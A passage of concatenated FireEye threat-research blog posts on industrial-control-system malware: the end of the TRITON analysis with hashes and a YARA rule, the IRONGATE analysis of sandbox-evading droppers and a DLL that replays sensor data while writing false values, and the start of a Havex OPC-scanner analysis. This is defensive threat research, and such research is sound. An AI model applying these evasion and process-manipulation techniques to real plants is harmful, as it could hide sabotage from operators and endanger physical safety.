  <i>TsLow</i> is an additional attacker module that implements the
  TriStation UDP wire protocol. The <i>TsBase</i> library primarily
  depends on the <i>ts_exec</i> method. This method takes the function
  code and expected response code, and serializes the commands payload
  over UDP. It checks the response from the controller against the
  expected value and returns a result data structure indicating success
  or a <i>False</i> object representing failure.</p>
 <p>
  <i>TsLow </i>also exposes the connect method used to check
  connectivity to the target controller. If invoked with no targets, it
  runs the device discovery function detect_ip. This leverages a
  &quot;ping&quot; message over the TriStation protocol using IP
  broadcast to find controllers that are reachable via a router from
  where the script is invoked.</p>
 <h4>Indicators</h4>
 <table cellspacing="0" cellpadding="0" border="1"> <tbody>
    <tr>
      <td width="173"><p>
          <b>Filename</b></p> </td> <td width="197" valign="top"><p>
          <b>Hash</b></p> </td> </tr>
    <tr>
      <td width="173"><p>trilog.exe</p> </td> <td width="197">MD5:
        6c39c3f4a08d3d78f2eb973a94bd7718<br /> SHA-256:<br />
      e8542c07b2af63ee7e72ce5d97d91036c5da56e2b091aa2afe737b224305d230</td> </tr>
    <tr>
      <td width="173"><p>imain.bin</p> </td> <td width="197"><p>MD5:
          437f135ba179959a580412e564d3107f<br /> SHA-256:<br />
        08c34c6ac9186b61d9f29a77ef5e618067e0bc9fe85cab1ad25dc6049c376949</p>
      </td> </tr>
    <tr>
      <td width="173"><p>inject.bin</p> </td> <td width="197"><p>MD5:
          0544d425c7555dc4e9d76b571f31f500<br /> SHA-256:<br />
        5fc4b0076eac7aa7815302b0c3158076e3569086c4c6aa2f71cd258238440d14</p>
      </td> </tr>
    <tr>
      <td width="173"><p>library.zip</p> </td> <td width="197"><p>MD5:
          0face841f7b2953e7c29c064d6886523<br /> SHA-256:<br />
        bef59b9a3e00a14956e0cd4a1f3e7524448cbe5d3cc1295d95a15b83a3579c59</p>
      </td> </tr>
    <tr>
      <td width="173"><p>TS_cnames.pyc</p> </td> <td width="197"><p>MD5:
          e98f4f3505f05bf90e17554fbc97bba9<br /> SHA-256:<br />
        2c1d3d0a9c6f76726994b88589219cb8d9c39dd9924bc8d2d02bf41d955fe326</p>
      </td> </tr>
    <tr>
      <td width="173"><p>TsBase.pyc</p> </td> <td width="197"><p>MD5:
          288166952f934146be172f6353e9a1f5<br /> SHA-256:<br />
        1a2ab4df156ccd685f795baee7df49f8e701f271d3e5676b507112e30ce03c42</p>
      </td> </tr>
    <tr>
      <td width="173"><p>TsHi.pyc</p> </td> <td width="197"><p>MD5:
          27c69aa39024d21ea109cc9c9d944a04<br /> SHA-256:<br />
        758598370c3b84c6fbb452e3d7119f700f970ed566171e879d3cb41102154272</p>
      </td> </tr>
    <tr>
      <td width="173"><p>TsLow.pyc</p> </td> <td width="197"><p>MD5:
          f6b3a73c8c87506acda430671360ce15<br /> SHA-256:<br />
        5c776a33568f4c16fee7140c249c0d2b1e0798a96c7a01bfd2d5684e58c9bb32</p>
      </td> </tr>
    <tr>
      <td width="173"><p>sh.pyc</p> </td> <td width="197"><p>MD5:
          8b675db417cc8b23f4c43f3de5c83438<br /> SHA-256:<br />
        c96ed56bf7ee85a4398cc43a98b4db86d3da311c619f17c8540ae424ca6546e1</p>
      </td> </tr></tbody></table>
 <h4>Detection</h4>
 <table cellspacing="0" cellpadding="0" border="1"> <tbody>
    <tr>
      <td width="600" valign="top"><p>rule TRITON_ICS_FRAMEWORK<br />
          {<br />       meta:<br />           author =
          &quot;nicholas.carr @itsreallynick&quot;<br />           md5 =
          &quot;0face841f7b2953e7c29c064d6886523&quot;<br />          
          description = &quot;TRITON framework recovered during Mandiant
          ICS incident response&quot;<br />       strings:<br />        
            $python_compiled = &quot;.pyc&quot; nocase ascii wide<br />
                    $python_module_01 = &quot;__module__&quot; nocase
          ascii wide<br />           $python_module_02 =
          &quot;&lt;module&gt;&quot; nocase ascii wide<br />          
          $python_script_01 = &quot;import Ts&quot; nocase ascii
          wide<br />           $python_script_02 = &quot;def ts_&quot;
          nocase ascii wide  </p> <p>          $py_cnames_01 =
          &quot;TS_cnames.py&quot; nocase ascii wide<br />          
          $py_cnames_02 = &quot;TRICON&quot; nocase ascii wide<br />    
                $py_cnames_03 = &quot;TriStation &quot; nocase ascii
          wide<br />           $py_cnames_04 = &quot; chassis &quot;
          nocase ascii wide  </p> <p>          $py_tslibs_01 =
          &quot;GetCpStatus&quot; nocase ascii wide<br />          
          $py_tslibs_02 = &quot;ts_&quot; ascii wide<br />          
          $py_tslibs_03 = &quot; sequence&quot; nocase ascii wide<br />
                    $py_tslibs_04 = /import Ts(Hi|Low|Base)[^:alpha:]/
          nocase ascii wide<br />           $py_tslibs_05 =
          /module\s?version/ nocase ascii wide<br />          
          $py_tslibs_06 = &quot;bad &quot; nocase ascii wide<br />      
              $py_tslibs_07 = &quot;prog_cnt&quot; nocase ascii
        wide  </p> <p>          $py_tsbase_01 = &quot;TsBase.py&quot;
          nocase ascii wide<br />           $py_tsbase_02 =
          &quot;.TsBase(&quot; nocase ascii wide <br />          <br />
                    $py_tshi_01 = &quot;TsHi.py&quot; nocase ascii
          wide<br />           $py_tshi_02 = &quot;keystate&quot; nocase
          ascii wide<br />           $py_tshi_03 =
          &quot;GetProjectInfo&quot; nocase ascii wide<br />          
          $py_tshi_04 = &quot;GetProgramTable&quot; nocase ascii
          wide<br />           $py_tshi_05 =
          &quot;SafeAppendProgramMod&quot; nocase ascii wide<br />      
              $py_tshi_06 = &quot;.TsHi(&quot; ascii nocase wide  </p>
          <p>          $py_tslow_01 = &quot;TsLow.py&quot; nocase ascii
          wide<br />           $py_tslow_02 =
          &quot;print_last_error&quot; ascii nocase wide<br />          
          $py_tslow_03 = &quot;.TsLow(&quot; ascii nocase wide<br />    
                $py_tslow_04 = &quot;tcm_&quot; ascii wide<br />        
            $py_tslow_05 = &quot; TCM found&quot; nocase ascii
        wide  </p> <p>          $py_crc_01 = &quot;crc.pyc&quot; nocase
          ascii wide<br />           $py_crc_02 =
          &quot;CRC16_MODBUS&quot; ascii wide<br />           $py_crc_03
          = &quot;Kotov Alaxander&quot; nocase ascii wide<br />        
            $py_crc_04 = &quot;CRC_CCITT_XMODEM&quot; ascii wide<br />  
                  $py_crc_05 = &quot;crc16ret&quot; ascii wide<br />    
                $py_crc_06 = &quot;CRC16_CCITT_x1D0F&quot; ascii
          wide<br />           $py_crc_07 = /CRC16_CCITT[^_]/ ascii
        wide  </p> <p>          $py_sh_01 = &quot;sh.pyc&quot; nocase
          ascii wide  </p> <p>          $py_keyword_01 = &quot;
          FAILURE&quot; ascii wide<br />           $py_keyword_02 =
          &quot;symbol table&quot; nocase ascii wide  </p> <p>         
          $py_TRIDENT_01 = &quot;inject.bin&quot; ascii nocase
          wide<br />           $py_TRIDENT_02 = &quot;imain.bin&quot;
          ascii nocase wide  </p> <p>      condition:<br />           2
          of ($python_*) and 7 of ($py_*) and filesize &lt; 3MB<br />
        }</p> </td> </tr></tbody></table>
http://www.fireeye.com/blog/threat-research/2017/12/attackers-deploy-new-ics-attack-framework-triton.html2017-12-14T15:00:00.000Z2020-07-24T06:34:44.932ZWhat About the Plant Floor? Six Subversive Concerns for ICS Environmentsnoemail@noemail.orgSean McBride<p>Industrial enterprises such as electric utilities, petroleum
  companies, and manufacturing organizations invest heavily in <a
    href="/content/fireeye-www/en_US/products/industrial-systems-and-critical-infrastructure-security.html">industrial
    control systems (ICS)</a> to efficiently, reliably, and safely
  operate industrial processes. Without this technology operating the
  plant floor, these businesses cannot exist.</p>
 <p>Board members, executives, and security officers are often unaware
  that the technology operating the economic engine of their enterprise
  invites undetected subversion.  </p>
 <p>In this paper, FireEye iSIGHT Intelligence prepares risk executives
  and security practitioners to knowledgeably discuss six core
  weaknesses an adversary can use to undermine a plant's operation:</p>
 <ul> <li>Unauthenticated protocols</li> <li>Outdated hardware</li>
    <li>Weak user authentication</li> <li>Weak file integrity
  checks</li> <li>Vulnerable Windows operating systems</li>
    <li>Undocumented third-party relationships</li> </ul>
 <p>Download <a
    href="https://www2.fireeye.com/WEB-Subversive-Six_RPT.html?utm_source=FEcom&amp;utm_campaign=subversivesix&amp;utm_medium=blog">the
  report</a> to learn more. To discuss these six subversive
  vulnerabilities threatening today’s industrial environments, <a
    href="https://engage.vevent.com/rt/fireeyeinc~subversivesix?utm_source=FEcom&amp;utm_campaign=subversivesix&amp;utm_medium=blog&amp;code=blog">register
    for our live webinar</a> scheduled for Tuesday, April 25 at 11:00am
  ET/8:00am PT. Explore the implications and how to address them
  firsthand with our ICS intelligence experts.</p>
http://www.fireeye.com/blog/threat-research/2017/04/six-subversive-concerns-for-ics-environments.html2017-04-12T12:00:00.000Z2020-07-24T06:34:44.932ZOverload: Critical Lessons from 15 Years of ICS Vulnerabilitiesnoemail@noemail.orgSean McBride<p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/ICS%20Vulnerabilities/hmi-malware.jpg" class="float-left" /></p>
 <p>In the past several years, a flood of vulnerabilities has hit <a
    href="/content/fireeye-www/en_US/products/industrial-systems-and-critical-infrastructure-security.html">industrial
    control systems (ICS)</a> – the technological backbone of electric
  grids, water supplies, and production lines. These vulnerabilities
  affect the reliable operation of sensors, programmable controllers,
  software and networking equipment used to automate and monitor the
  physical processes that keep our modern world running.</p>
 <p>
  <a
    href="/content/fireeye-www/en_US/products-delete/dynamic-threat-intelligence.html">FireEye
    iSIGHT Intelligence</a> has identified nearly 1,600 publicly
  disclosed ICS vulnerabilities since 2000. We go more in depth on these
  issues in our latest report, <i>
    <a
      href="https://www2.fireeye.com/industrial-control-systems-vulnerability-trend-report-2016.html?utm_source=PSA&amp;utm_medium=blog&amp;utm_campaign=icstrendreport">Overload:
      Critical Lessons from 15 Years of ICS Vulnerabilities</a></i>,
  which highlights trends in total ICS vulnerability disclosures, patch
  availability, vulnerable device type and vulnerabilities exploited in
  the wild.</p>
 <p>FireEye’s acquisition of iSIGHT provided tremendous visibility into
  the depth and breadth of vulnerabilities in the ICS landscape and how
  threat actors try to exploit them. To make matters worse, many of
  these vulnerabilities are left unpatched and some are simply
  unpatchable due to outdated technology, thus increasing the attack
  surface for potential adversaries. In fact, nation-state cyber threat
  actors have exploited five of these vulnerabilities in attacks since 2009.</p>
 <p>Unfortunately, security personnel from manufacturing, energy, water
  and other industries are often unaware of their own control system
  assets, not to mention the vulnerabilities that affect them. As a
  result, organizations operating these systems are missing the warnings
  and leaving their industrial environments exposed to potential threats.</p>
 <p>Click <a
  href="https://www2.fireeye.com/industrial-control-systems-vulnerability-trend-report-2016.html?utm_source=PSA&amp;utm_medium=blog&amp;utm_campaign=icstrendreport">here</a>
  to download the report and learn more.</p>
http://www.fireeye.com/blog/threat-research/2016/08/overload-critical-lessons-from-15-years-of-ics-vulnerabilities.html2016-08-03T12:00:00.000Z2020-07-24T06:34:44.932ZIRONGATE ICS Malware: Nothing to See Here...Masking Malicious Activity
on SCADA Systemsnoemail@noemail.orgJosh Homan<p>In the latter half of 2015, the FireEye Labs Advanced Reverse
  Engineering (FLARE) team identified several versions of an ICS-focused
  malware crafted to manipulate a specific industrial process running
  within a simulated Siemens control system environment. We named this
  family of malware IRONGATE.</p>
 <p>FLARE found the samples on VirusTotal while researching droppers
  compiled with PyInstaller — an approach used by numerous malicious
  actors. The IRONGATE samples stood out based on their references to
  SCADA and associated functionality. Two samples of the malware payload
  were uploaded by different sources in 2014, but none of the antivirus
  vendors featured on VirusTotal flagged them as malicious.</p>
 <p>Siemens Product Computer Emergency Readiness Team (ProductCERT)
  confirmed that IRONGATE is not viable against operational Siemens
  control systems and determined that IRONGATE does not exploit any
  vulnerabilities in Siemens products. We are unable to associate
  IRONGATE with any campaigns or threat actors. We acknowledge that
  IRONGATE could be a test case, proof of concept, or research activity
  for ICS attack techniques.</p>
 <p>Our analysis finds that IRONGATE invokes ICS attack concepts first
  seen in <a
  href="http://www.symantec.com/content/en/us/enterprise/media/security_response/whitepapers/stuxnet_0_5_the_missing_link.pdf">Stuxnet</a>,
  but in a simulation environment. Because the body of <a
    href="/content/fireeye-www/en_US/products/industrial-systems-and-critical-infrastructure-security.html">industrial
    control systems (ICS)</a> and supervisory control and data
  acquisition (SCADA) malware is limited, we are sharing details with
  the broader community.</p>
 <h4>Malicious Concepts</h4>
 <p>
  <b>Deceptive Man-in-the-Middle</b></p>
 <p>IRONGATE's key feature is a man-in-the-middle (MitM) attack against
  process input-output (IO) and process operator software within
  industrial process simulation. The malware replaces a Dynamic Link
  Library (DLL) with a malicious DLL, which then acts as a broker
  between a PLC and the legitimate monitoring software. This malicious
  DLL records five seconds of 'normal' traffic from a PLC to the user
  interface and replays it, while sending different data back to the
  PLC. This could allow an attacker to alter a controlled process
  unbeknownst to process operators.</p>
 <p>
  <b>Sandbox Evasion</b></p>
 <p>IRONGATE's second notable feature involves sandbox evasion. Some
  droppers for the IRONGATE malware would not run if VMware or Cuckoo
  Sandbox environments were employed. The malware uses these techniques
  to avoid detection and resist analysis, and developing these
  anti-sandbox techniques indicates that the author wanted the code to
  resist casual analysis attempts. It also implies that IRONGATE’s
  purpose was malicious, as opposed to a tool written for other
  legitimate purposes.</p>
 <p>
  <b>Dropper Observables</b></p>
 <p>We first identified IRONGATE when investigating droppers compiled
  with PyInstaller — an approach used by numerous malicious actors. In
  addition, strings found in the dropper include the word “payload”,
  which is commonly associated with malware.</p>
 <h4>Unique Features for ICS Malware</h4>
 <p>While IRONGATE malware does not compare to Stuxnet in terms of
  complexity, ability to propagate, or geopolitical implications,
  IRONGATE leverages some of the same features and techniques Stuxtnet
  used to attack centrifuge rotor speeds at the Natanz uranium
  enrichment facility; it also demonstrates new features for ICS malware.</p>
 <ul> <li>Both pieces of malware look for a single, highly specific
  process.</li> <li>Both replace DLLs to achieve process
  manipulation.</li> <li>IRONGATE detects malware detonation/observation
    environments, whereas Stuxnet looked for the presence of antivirus
  software.</li> <li>IRONGATE actively records and plays back process
    data to hide manipulations, whereas Stuxnet did not attempt to hide
    its process manipulation, but suspended normal operation of the
    S7-315 so even if rotor speed had been displayed on the HMI, the
    data would have been <a
  href="http://www.langner.com/en/wp-content/uploads/2013/11/To-kill-a-centrifuge.pdf">static</a>.</li> </ul>
 <h4>A Proof of Concept</h4>
 <p>IRONGATE’s characteristics lead us to conclude that it is a test,
  proof of concept, or research activity.</p>
 <ul> <li>The code is specifically crafted to look for a user-created
    DLL communicating with the Siemens PLCSIM environment. PLCSIM is
    used to test PLC program functionality prior to in-field deployment.
    The DLLs that IRONGATE seeks and replaces are not part of the
    Siemens standard product set, but communicate with the S7ProSim COM
    object. Malware authors test concepts using commercial simulation
  software.</li> <li>Code in the malicious software closely matched
    usage on a control engineering blog dealing with PLCSIM
    (https://alexsentcha.wordpress.com/using-s7-prosim-with-siemens-s7-plcsim/
    and
  https://pcplcdemos.googlecode.com/hg/S7PROSIM/BioGas/S7%20v5.5/).</li>
    <li>While we have identified and analyzed several droppers for the
    IRONGATE malware, we have yet to identify the code’s infection
  vector.</li> <li>In addition, our analysis did not identify what
    triggers the MitM payload to install; the <span
      class="code">scada.exe </span>binary that deploys the IRONGATE DLL
    payload appears to require manual execution.</li> <li>We have not
    identified any other instances of the ICS-specific IRONGATE
    components (<span class="code">scada.exe</span> and <span
    class="code">Step7ProSim.dll</span>), despite their having been
    compiled in September of 2014.</li> <li>Siemens ProductCERT has
    confirmed that the code would not work against a standard Siemens
    control system environment.</li> </ul>
 <h4>Implications for ICS Asset Owners</h4>
 <p>Even though process operators face no increased risk from the
  currently identified members of the IRONGATE malware family, IRONGATE
  provides valuable insight into adversary mindset.</p>
 <p>Network security monitoring, indicator of compromise (IoC) matching,
  and good practice guidance from vendors and other stakeholders
  represent important defensive techniques for ICS networks.</p>
 <p>To specifically counter IRONGATE’s process attack techniques, ICS
  asset owners may, over the longer term, implement solutions that:</p>
 <ul> <li>Require integrity checks and code signing for vendor and user
    generated code. Lacking cryptographic verification facilitates file
    replacement and MitM attacks against controlled industrial
  processes.</li> <li>Develop mechanisms for sanity checking IO data,
    such as independent sensing and backhaul, and comparison with
    expected process state information. Ignorance of expected process
    state facilitates an attacker’s ability to achieve physical
    consequence without alarming operators.</li> </ul>
 <h4>Technical Malware Analysis</h4>
 <h5>IRONGATE Dropper Family</h5>
 <p>FireEye has identified six IRONGATE droppers: <span
    class="code">bla.exe, update.exe<sub>1</sub>,
    update_no_pipe.exe<sub>1,</sub> update_no_pipe.exe<sub>2</sub>,
      update_no_pipe.exe<sub>2</sub>,<sub>
  </sub>update.exe<sub>3</sub>.</span> All but one of these Python-based
  droppers first checks for execution in a VMware or Cuckoo Sandbox
  environment. If found, the malware exits.</p>
 <p>If not found, the IRONGATE dropper extracts a UPX-packed, publicly
  available utility (<a
    href="http://www.nirsoft.net/utils/netresview.html">NirSoft
    NetResView version 1.27</a>) to <span
  class="code">audiodg.exe</span> in the same directory as the dropper.
  The dropper then executes the utility using the command <span
    class="code">audiodg.exe /scomma scxrt2.ini.</span> This command
  populates the file <span class="code">scxrt2.ini</span> with a
  comma-separated list of network resources identified by the host system.</p>
 <p>The dropper iterates through each entry in <span
  class="code">scxrt2.ini</span>, looking for paths named <span
  class="code">move-to-operational</span> or <span
  class="code">move-to-operational.lnk</span>. If a path is found, the
  dropper first extracts the Base64-encoded .NET executable <span
    class="code">scada.exe </span>to the current directory and then
  moves the file to the path containing<span class="code">
  move-to-operational</span> or <span
  class="code">move-to-operational.lnk.</span> The path <span
  class="code">move-to-operational</span> is interesting as well,
  perhaps implying that IRONGATE was not seeking the actual running
  process, but rather a staging area for code promotion. The dropper
  does not execute the <span class="code">scada.exe </span>payload after
  moving it.</p>
 <p>
  <b>Anti-Analysis Techniques</b></p>
 <p>Each IRONGATE dropper currently identified deploys the same .NET
  payload, <span class="code">scada.exe.</span> All but one of the
  droppers incorporated anti-detection/analysis techniques to identify
  execution in VMware or the Cuckoo Sandbox. If such environments are
  detected, the dropper will not deploy the .NET executable (<span
  class="code">scada.exe</span>) to the host.</p>
 <p>Four of the droppers (<span class="code">update.exe<sub>1</sub>,
    update_no_pipe.exe<sub>1</sub>,
  update_no_pipe.exe<sub>2</sub>,</span> and <span
  class="code">update.exe<sub>3</sub></span>) detect Cuckoo environments
  by scanning subdirectories of the <span class="code"
  style="color: rgb(216,36,53);">%SystemDrive%</span>. Directories with
  names greater than five, but fewer than ten characters are inspected
  for the subdirectories <span class="code">drop, files, logs,
  memory,</span> and <span class="code">shots.</span> If a matching
  directory is found, the dropper does not attempt to deploy the <span
  class="code">scada.exe</span> payload.</p>
 <p>The <span class="code">update.exe<sub>1</sub></span> and <span
  class="code">update.exe<sub>3</sub></span> droppers contain code for
  an additional Cuckoo check using the SysInternals pipelist program,
    <span class="code">install.exe</span>, but the code is disabled in each.</p>
 <p>The <span class="code">update.exe<sub>2</sub></span> dropper
  includes a check for VMware instead of Cuckoo. The VMWare check looks
  for the registry key <span class="code">HKLM\SOFTWARE\VMware,
    Inc.\VMware Tools</span> and the files <span class="code">
    <span
  style="color: rgb(216,36,53);">%WINDIR%</span>\system32\drivers\vmmouse.sys</span>
  and <span class="code">
    <span
  style="color: rgb(216,36,53);">%WINDIR%</span>\system32\drivers\vmhgfs.sys</span>.
  If any of these are found, the dropper does not attempt to deploy the
    <span class="code">scada.exe</span> payload.</p>
 <p>The dropper <span class="code">bla.exe</span> does not include an
  environment check for either Cuckoo or VMware.</p>
 <p>
  <b>scada.exe Payload</b></p>
 <p>We surmise that<span class="code"> scada.exe</span> is a
  user-created payload used for testing the malware. First, our analysis
  did not indicate what triggers <span class="code">scada.exe </span>to
  run. Second, Siemens ProductCERT informed us that <span
  class="code">scada.exe</span> is not a default file name associated
  with Siemens industrial control software.</p>
 <p>When <span class="code">scada.exe</span> executes, it scans drives
  attached to the system for filenames ending in <span
  class="code">Step7ProSim.dll</span>. According to the Siemens
  ProductCERT, <span class="code">Step7ProSim.dll</span> is not part of
  the Siemens PLCSIM software. We were unable to determine whether this
  DLL was created specifically by the malware author, or if it was from
  another source, such as example code or a particular custom ICS
  implementation. We surmise this DLL simulates generation of IO values,
  which would normally be provided by an S7-based controller, since the
  functions it includes appear derived from the Siemens PLCSIM environment.</p>
 <p>If <span class="code">scada.exe </span>finds a matching DLL file
  name, it kills all running processes with the name <span
  class="code">biogas.exe</span>. The malware then moves <span
    class="code">Step7ProSim.dll </span>to <span
    class="code">Step7ConMgr.dll </span>and drops a malicious <span
  class="code">Step7ProSim.dll</span> – the IRONGATE payload – to the
  same directory.</p>
 <p>The malicious <span class="code">Step7ProSim.dll</span> acts as an
  API proxy between the original user-created <span
    class="code">Step7ProSim.dll </span>(now named <span
  class="code">Step7ConMgr.dll</span>) and the application <span
  class="code">biogas.exe</span> that loads it. Five seconds after
  loading, the malicious <span class="code">Step7ProSim.dll
  </span>records five seconds of calls to <span
  class="code">ReadDataBlockValue</span>. All future calls to <span
    class="code">ReadDataBlockValue </span>return the recorded data.</p>
 <p>Simultaneously, the malicious DLL discards all calls to <span
    class="code">WriteDataBlockValue </span>and instead calls <span
    class="code">WriteInputPoint(0x110, 0, 0x7763)</span> and <span
    class="code">WriteInputPoint(0x114, 0, 0x7763)</span> every
  millisecond. All of these functions are named similarly to Siemens
  S7ProSim v5.4 COM interface. It appears that other calls to API
  functions are passed through the malicious DLL to the legitimate DLL
  with no other modification.</p>
 <p>
  <b>Biogas.exe</b></p>
 <p>As mentioned previously, IRONGATE seeks to manipulate code similar
  to that found on a blog dealing with simulating PLC communications
  using PLCSIM, including the use of an executable named <span class="code">biogas.exe</span>.</p>
 <p>Examination of the executable from that blog’s demo code shows that
  the <span class="code">WriteInputPoint </span>function calls with byte
  indices <span class="code">0x110</span> and <span
  class="code">0x114</span> set pressure and temperature values, respectively:</p>
 <p>IRONGATE:</p>
 <p>        <span class="code"> WriteInputPoint(0x110, 0, 0x7763)<br />
    WriteInputPoint(0x114, 0, 0x7763)</span></p>
 <p> Equivalent pseudo code from Biogas.exe: </p>
 <p>
  <span class="code">        S7ProSim.WriteInputPoint(0x110, 0,
    (short)this.Pressure.Value)<br />      
    S7ProSim.WriteInputPoint(0x114, 0, (short)this.Temperature.Value)</span></p>
 <p>We have been unable to determine the significance of the hardcoded
  value <span class="code">0x7763</span>, which is passed in both
  instances of the write function.</p>
 <p>Because of the noted indications that IRONGATE is a proof of
  concept, we cannot conclude IRONGATE’s author intends to manipulate
  specific temperature or pressure values associated with the specific
  biogas.exe process, but find the similarities to this example code striking.</p>
 <h4>Artifacts and Indicators</h4>
 <h5>PyInstaller Artifacts</h5>
 <p>The IRONGATE droppers are Python scripts converted to executables
  using PyInstaller. The compiled droppers contain PyInstaller artifacts
  from the system the executables were created on. These artifacts may
  link other samples compiled on the same system. Five of the six file
  droppers (<span class="code">bla.exe, update.exe<sub>1</sub>,
    update_no_pipe.exe<sub>1</sub>, update_no_pipe.exe<sub>2</sub> and
  update.exe<sub>3</sub></span>) all share the same PyInstaller
  artifacts listed in Table 1.</p>
 <p>
  <img src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/IRONGATE%20ICS/table1irongate.jpg" />
  <span class="type-XS">Table 1: Pyinstaller Artifacts</span></p>
 <p>The remaining dropper, <span
  class="code">update.exe<sub>2</sub></span>, contains the artifacts
  listed in Table 2.</p>
 <p>
  <img src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/IRONGATE%20ICS/table2irongate.jpg" /></p>
 <p>
  <span class="type-XS">Table 2: Pyinstaller Artifacts for update.exe<sub>2</sub></span></p>
 <h5>Unique Strings</h5>
 <p>Figure 1 and 2 list the unique strings discovered in the <span
  class="code">scada.exe</span> and <span class="code">Step7ProSim.dll binaries.</span></p>
 <p>
  <img src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/IRONGATE%20ICS/fig1irongate.jpg" /></p>
 <p>
  <span class="type-XS">Figure 1: Scada.exe Unique Strings</span></p>
 <p>
  <img src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/IRONGATE%20ICS/fig2irongate.jpg" /></p>
 <p>
  <span class="type-XS">Figure 2: Step7ProSim.dll Unique Strings</span></p>
 <h5>File Hashes</h5>
 <p>Table 3 contains the MD5 hashes, file and architecture type, and
  compile times for the malware analyzed in this report.</p>
 <p>
  <img src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/IRONGATE%20ICS/table3irongate.jpg" />
  <span class="type-XS">Table 3: File MD5 Hashes and Compile Times</span></p>
 <p>FireEye detects IRONGATE. A list of indicators can be found <a href="https://github.com/fireeye/iocs">here</a>.</p>
 <p>Special thanks to the Siemens ProductCERT for providing support and
  context to this investigation.</p>
http://www.fireeye.com/blog/threat-research/2016/06/irongate_ics_malware.html2016-06-02T12:00:00.000Z2020-07-24T06:34:44.933ZHavex, It’s Down With OPCnoemail@noemail.orgKyle Wilhoit<p>FireEye recently analyzed the capabilities of a variant of Havex
  (referred to by FireEye as “Fertger” or “PEACEPIPE”), the first
  publicized malware reported to actively scan OPC servers used for
  controlling SCADA (Supervisory Control and Data Acquisition) devices
  in critical infrastructure (e.g., water and electric utilities),
  energy, and manufacturing sectors.</p>
 <p>While Havex itself is a somewhat simple PHP Remote Access Trojan
  (RAT) that has been analyzed by other sources, none of these have
  covered the scanning functionality that could impact <a
    href="/content/fireeye-www/en_US/products/industrial-systems-and-critical-infrastructure-security.html">SCADA
    devices and other industrial control systems (ICS)</a>.
  Specifically, this Havex variant targets servers involved in OPC
  (Object linking and embedding for Process Control) communication, a
  client/server technology widely used in process control systems (for
  example, to control water pumps, turbines, tanks, etc.).</p>
 <p>
  <i>Note: ICS is a general term that encompasses SCADA (Supervisory
    Control and Data Acquisition) systems, DCS (Distributed Control
    Systems), and other control system environments. The term SCADA is
    well-known to wider audiences, and throughout this article, ICS and
    SCADA will be used interchangeably.</i></p>
 <p>Threat actors have leveraged Havex in attacks across the energy
  sector for over a year, but the full extent of industries and ICS
  systems affected by Havex is unknown. We decided to examine the OPC
  scanning component of Havex more closely, to better understand what
  happens when it’s executed and the possible implications.</p>
 <p>
  <b>OPC Testing Environment</b></p>
 <p>To conduct a true test of the Havex variant’s functionality, we
  constructed an OPC server test environment that fully replicates a
  typical OPC server setup (Figure 1<a href="#_ftn3"><sup>
      <sup>[3]</sup></sup></a>). As shown, ICS or SCADA systems involve
  OPC client software that interacts directly with an OPC server, which
  works in tandem with the PLC (Programmable Logic Controller) to
  control industrial hardware (such as a water pump, turbine, or tank).
  FireEye replicated both the hardware and software the OPC server setup
  (the components that appear within the dashed line on the right side
  of Figure 1).</p>
 <p> </p>
 <div>
  <p> </p> <p style="text-align: center;">
    <a href="/content/dam/legacy/blog/2014/07/havex1.png"><img
        width="458" height="183"
        class="aligncenter  wp-image-5991 landscape-sm" alt="havex1"
  src="https://www.fireeye.com/content/dam/legacy/blog/2014/07/havex1.png" /></a><b></b></p>
    <p style="text-align: center;">
    <b>Figure 1: Topology of typical OPC server setup</b></p> <p>The
    components of our test environment are robust and comprehensive to
    the point that our system could be deployed in an environment to
    control actual SCADA devices. We utilized an Arduino Uno<a href="#_ftn1"><sup>
        <sup>[1]</sup></sup></a> as the primary hardware platform,
    acting as the OPC server. The Arduino Uno is an ideal platform for
    developing an ICS test environment because of the low power
    requirements, a large number of libraries to make programming the
    microcontroller easier, serial communication over USB, and cheap
    cost. We leveraged the OPC Server and libraries from St4makers<a href="#_ftn2"><sup>
        <sup>[2]</sup></sup></a> (as shown in Figure 2). This software
    is available for free to SCADA engineers to allow them to develop
    software to communicate information to and from SCADA devices.</p>
    <p style="text-align: center;">
    <a href="/content/dam/legacy/blog/2014/07/havex2.png"><img
        width="288" height="201"
        class="aligncenter  wp-image-5990 landscape-sm" alt="havex2"
  src="https://www.fireeye.com/content/dam/legacy/blog/2014/07/havex2.png" /></a></p>
    <p style="text-align: center;">
    <b>Figure 2: OPC Server Setup</b></p> <p>Using the OPC Server
    libraries allowed us to make the Arduino Uno act as a true,
    functioning OPC SCADA device (Figure 3).</p> <p style="text-align: center;">
    <a href="/content/dam/legacy/blog/2014/07/havex3.png"><img
        width="265" height="200"
        class=" wp-image-5989 aligncenter landscape-sm" alt="havex3"
  src="https://www.fireeye.com/content/dam/legacy/blog/2014/07/havex3.png" /></a></p>
    <p style="text-align: center;">
    <b>Figure 3: Matrikon OPC Explorer showing Arduino OPC
  Server</b></p> <p>We also used Matrikon’s OPC Explorer<a href="#_ftn1"><sup>
        <sup>[1]</sup></sup></a>, which enables browsing between the
    Arduino OPC server and the Matrikon embedded simulation OPC server.
    In addition, the Explorer can be used to add certain data points to
    the SCADA device – in this case, the Arduino device.</p> <p style="text-align: center;">
    <a href="/content/dam/legacy/blog/2014/07/havex4.png"><img
        width="393" height="157"
        class="aligncenter  wp-image-5988 landscape-sm" alt="havex4"
  src="https://www.fireeye.com/content/dam/legacy/blog/2014/07/havex4.png" /></a></p>
    <p style="text-align: center;">
    <b>Figure 4: Tags identified for OPC server</b></p> <p>In the OPC
    testing environment, we created tags in order to simulate a true OPC
    server functioning. Tags, in relation to ICS devices, are single
    data points. For example: temperature, vibration, or fill level.
    Tags represent a single value monitored or controlled by the system
    at a single point in time.</p> <p>With our test environment
    complete, we executed the malicious Havex “.dll&quot; file and
    analyzed how Havex’s OPC scanning module might affect OPC servers it
    comes in contact with.</p> <p>
    <b>Analysis</b></p> <p>The particular Havex sample we looked at was
    a file named PE.dll (6bfc42f7cb1364ef0bfd749776ac6d38). When looking
    into the scanning functionality of the particular Havex sample, it
    directly scans for OPC servers, both on the server the sample was
    submitted on, and laterally, across the entire network.</p> <p
    style="text-align: left;">The scanning process starts when the Havex
    downloader calls the runDll export function.  The OPC scanner module
    identifies potential OPC servers by using the Windows networking
    (WNet) functions.  Through recursive calls to WNetOpenEnum and
    WNetEnumResources, the scanner builds a list of all servers that are
